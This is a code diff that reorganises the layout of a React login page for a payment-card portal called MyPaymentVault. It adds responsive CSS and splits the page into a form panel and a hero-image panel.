@@ -121,6 +121,7 @@ export default function Login() {
       style={{ background: "#f7f7f7" }}
     >
       <style>{`
+        /* ── MOBILE ── */
         @media (max-width: 520px) {
           .login-outer {
             background: #fff !important;
@@ -136,6 +137,52 @@ export default function Login() {
           .login-footer {
             display: none !important;
           }
+        }
+        /* ── DESKTOP ── */
+        @media (min-width: 769px) {
+          .login-card {
+            flex-direction: row !important;
+            max-width: 900px !important;
+            min-height: unset !important;
+            overflow: hidden;
+          }
+          .login-right {
+            flex: 0 0 420px;
+            order: 1;
+            display: flex;
+            flex-direction: column;
+          }
+          .login-hero-mobile {
+            display: none !important;
+          }
+          .login-left {
+            flex: 1;
+            order: 2;
+            position: relative;
+            min-height: 100%;
+            overflow: hidden;
+            background: #111;
+            display: flex !important;
+          }
+          .login-left img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.75;
+            display: block;
+          }
+          .login-left-overlay {
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            padding: 28px 24px;
+            color: #fff;
+            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 100%);
+          }
+        }
+        /* DESKTOP: sembunyikan login-left di mobile */
+        @media (max-width: 768px) {
+          .login-left { display: none !important; }
+          .login-right { width: 100%; }
         }
       `}</style>
       {/* ── MODAL 1: VERIFICATION REQUIRED ── */}
@@ -356,179 +403,139 @@ export default function Login() {
       {/* ─── CARD ─── */}
       <div
         className="w-full flex flex-col bg-white login-card"
-        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
+        style={{ boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
       >
-        {/* ══ HEADER ROW: Logo kiri + Language kanan ══ */}
-        <div
-          className="flex items-center justify-between"
-          style={{ padding: "18px 24px 18px 24px", borderBottom: "1px solid #ebebeb" }}
-        >
-          {/* Logo text */}
-          <span
-            className="select-none"
-            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
-          >
-            <span style={{ fontWeight: 300 }}>MY</span>
-            <span style={{ fontWeight: 700 }}>PAYMENT</span>
-            <span style={{ fontWeight: 300 }}>VAULT</span>
-          </span>
 
-          {/* Language selector */}
-          <div className="relative">
-            <button
-              type="button"
-              onClick={() => setShowLangDropdown(!showLangDropdown)}
-              style={{
-                display: "flex", alignItems: "center", gap: 5,
-                color: "#555", fontSize: 13, background: "none",
-                border: "none", cursor: "pointer",
-              }}
-            >
-              <Globe size={18} color="#555" />
-            </button>
-            {showLangDropdown && (
-              <>
-                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
-                <div
-                  style={{
-                    position: "absolute", right: 0, top: "100%", marginTop: 4,
-                    width: 140, background: "#fff", border: "1px solid #ddd",
-                    boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
-                  }}
-                >
-                  {languageOptions.map((opt) => (
-                    <button
-                      key={opt.code}
-                      type="button"
-                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
-                      style={{
-                        display: "block", width: "100%", textAlign: "left",
-                        padding: "10px 16px", fontSize: 13, background: "none",
-                        border: "none", cursor: "pointer",
-                        fontWeight: lang === opt.code ? 600 : 400,
-                        color: lang === opt.code ? "#111" : "#555",
-                      }}
-                    >
-                      {opt.label}
-                    </button>
-                  ))}
+        {/* ══ RIGHT PANEL — form (order:1, kiri di desktop) ══ */}
+        <div className="login-right">
+
+          {/* HEADER ROW: Logo kiri + Language kanan */}
+          <div
+            className="flex items-center justify-between"
+            style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
+          >
+            <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
+              <span style={{ fontWeight: 300 }}>MY</span>
+              <span style={{ fontWeight: 700 }}>PAYMENT</span>
+              <span style={{ fontWeight: 300 }}>VAULT</span>
+            </span>
+            <div className="relative">
+              <button
+                type="button"
+                onClick={() => setShowLangDropdown(!showLangDropdown)}
+                style={{ display: "flex", alignItems: "center", gap: 5, color: "#555", fontSize: 13, background: "none", border: "none", cursor: "pointer" }}
+              >
+                <Globe size={18} color="#555" />
+              </button>
+              {showLangDropdown && (
+                <>
+                  <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
+                  <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20 }}>
+                    {languageOptions.map((opt) => (
+                      <button
+                        key={opt.code}
+                        type="button"
+                        onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
+                        style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
+                      >
+                        {opt.label}
+                      </button>
+                    ))}
+                  </div>
+                </>
+              )}
+            </div>
+          </div>
+
+          {/* HERO IMAGE — mobile only (disembunyikan di desktop) */}
+          <div className="login-hero-mobile" style={{ width: "100%", lineHeight: 0 }}>
+            <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
+          </div>
+
+          {/* FORM */}
+          <div style={{ padding: "28px 28px 24px" }}>
+            <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 6 }}>
+              {t.accessAccount}
+            </h2>
+            <p style={{ fontSize: 13, color: "#666", marginBottom: 22 }}>
+              {t.notEnrolled}{" "}
+              <button type="button" onClick={() => navigate("/create-account")} style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 13 }}>
+                {t.createAccount}
+              </button>
+            </p>
+
+            <form onSubmit={handleSubmit}>
+              {/* Username */}
+              <div style={{ marginBottom: 14 }}>
+                <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
+                  <button type="button" onClick={() => navigate("/forgot-username")} style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
+                    {t.forgotUsername}
+                  </button>
                 </div>
-              </>
-            )}
+                <input
+                  type="text"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  required
+                  placeholder={`${t.username}*`}
+                  style={{ width: "100%", height: 42, padding: "0 12px", border: "1px solid #ccc", fontSize: 13, color: "#333", outline: "none", boxSizing: "border-box", borderRadius: 3 }}
+                />
+              </div>
+
+              {/* Password */}
+              <div style={{ marginBottom: 18 }}>
+                <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
+                  <button type="button" onClick={() => navigate("/forgot-password")} style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
+                    {t.forgotPassword}
+                  </button>
+                </div>
+                <input
+                  type="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  required
+                  placeholder={`${t.password}*`}
+                  style={{ width: "100%", height: 42, padding: "0 12px", border: "1px solid #ccc", fontSize: 13, color: "#333", outline: "none", boxSizing: "border-box", borderRadius: 3 }}
+                />
+              </div>
+
+              {error && (
+                <div style={{ background: "#fff0f0", border: "1px solid #fcc", color: "#c00", fontSize: 12, textAlign: "center", padding: "8px 12px", marginBottom: 12 }}>
+                  {error}
+                </div>
+              )}
+
+              <button
+                type="submit"
+                disabled={loading}
+                style={{ width: "100%", height: 44, background: "#111", color: "#fff", fontSize: 14, fontWeight: 500, border: "none", cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.6 : 1, letterSpacing: "0.04em", borderRadius: 3 }}
+              >
+                {loading ? t.loggingIn : t.login}
+              </button>
+            </form>
+
+            <p style={{ fontSize: 12, color: "#777", textAlign: "center", marginTop: 16 }}>
+              {t.newCard}{" "}
+              <button type="button" onClick={() => navigate("/activate-card")} style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 12 }}>
+                {t.activateCard}
+              </button>
+            </p>
+          </div>
+
+        </div>{/* end login-right */}
+
+        {/* ══ LEFT PANEL — hero image (order:2, kanan di desktop) ══ */}
+        <div className="login-left">
+          <img src="/hero-vault-new.png" alt="MyPaymentVault" />
+          <div className="login-left-overlay">
+            <div style={{ fontSize: 11, letterSpacing: "0.22em", fontWeight: 300, opacity: 0.75, marginBottom: 8, textTransform: "uppercase" }}>Secure Payment Platform</div>
+            <div style={{ fontSize: 20, letterSpacing: "0.14em", fontWeight: 700, marginBottom: 6 }}>
+              <span style={{ fontWeight: 300 }}>MY</span>PAYMENT<span style={{ fontWeight: 300 }}>VAULT</span>
+            </div>
+            <div style={{ fontSize: 13, opacity: 0.6, fontWeight: 300 }}>Access and manage your account securely.</div>
           </div>
         </div>
 
-        {/* ══ HERO IMAGE — di bawah header ══ */}
-        <div style={{ width: "100%", lineHeight: 0 }}>
-          <img
-            src="/hero-vault-new.png"
-            alt="MyPaymentVault"
-            style={{ width: "100%", display: "block" }}
-          />
-        </div>
-
-        {/* ══ FORM — di bawah gambar ══ */}
-        <div style={{ padding: "28px 28px 24px" }}>
-          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 6 }}>
-            {t.accessAccount}
-          </h2>
-          <p style={{ fontSize: 13, color: "#666", marginBottom: 22 }}>
-            {t.notEnrolled}{" "}
-            <button
-              type="button"
-              onClick={() => navigate("/create-account")}
-              style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 13 }}
-            >
-              {t.createAccount}
-            </button>
-          </p>
-
-          <form onSubmit={handleSubmit}>
-            {/* Username */}
-            <div style={{ marginBottom: 14 }}>
-              <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
-                <button
-                  type="button"
-                  onClick={() => navigate("/forgot-username")}
-                  style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
-                >
-                  {t.forgotUsername}
-                </button>
-              </div>
-              <input
-                type="text"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                required
-                placeholder={`${t.username}*`}
-                style={{
-                  width: "100%", height: 42, padding: "0 12px",
-                  border: "1px solid #ccc", fontSize: 13, color: "#333",
-                  outline: "none", boxSizing: "border-box", borderRadius: 3,
-                }}
-              />
-            </div>
-
-            {/* Password */}
-            <div style={{ marginBottom: 18 }}>
-              <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
-                <button
-                  type="button"
-                  onClick={() => navigate("/forgot-password")}
-                  style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
-                >
-                  {t.forgotPassword}
-                </button>
-              </div>
-              <input
-                type="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                required
-                placeholder={`${t.password}*`}
-                style={{
-                  width: "100%", height: 42, padding: "0 12px",
-                  border: "1px solid #ccc", fontSize: 13, color: "#333",
-                  outline: "none", boxSizing: "border-box", borderRadius: 3,
-                }}
-              />
-            </div>
-
-            {error && (
-              <div style={{
-                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
-                fontSize: 12, textAlign: "center", padding: "8px 12px", marginBottom: 12,
-              }}>
-                {error}
-              </div>
-            )}
-
-            <button
-              type="submit"
-              disabled={loading}
-              style={{
-                width: "100%", height: 44, background: "#111", color: "#fff",
-                fontSize: 14, fontWeight: 500, border: "none",
-                cursor: loading ? "not-allowed" : "pointer",
-                opacity: loading ? 0.6 : 1,
-                letterSpacing: "0.04em", borderRadius: 3,
-              }}
-            >
-              {loading ? t.loggingIn : t.login}
-            </button>
-          </form>
-
-          <p style={{ fontSize: 12, color: "#777", textAlign: "center", marginTop: 16 }}>
-            {t.newCard}{" "}
-            <button
-              type="button"
-              onClick={() => navigate("/activate-card")}
-              style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 12 }}
-            >
-              {t.activateCard}
-            </button>
-          </p>
-        </div>
       </div>
 
       {/* ─── FOOTER ─── */}
